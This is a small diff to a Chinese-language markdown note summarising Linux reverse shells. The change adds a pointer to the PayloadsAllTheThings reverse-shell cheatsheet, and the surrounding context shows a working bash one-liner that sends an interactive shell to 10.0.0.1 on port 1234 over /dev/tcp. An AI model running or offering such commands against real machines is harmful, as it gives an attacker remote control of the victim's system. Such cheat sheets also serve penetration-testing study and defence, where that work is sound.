@@ -11,6 +11,16 @@ Summary: Linux反弹shell总结
 
 #### 汇总
 
+更多总结，查看
+
+```bash
+
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
+
+```
+
+
+
 ```bash
 bash -i >& /dev/tcp/10.0.0.1/1234 0>&1
 
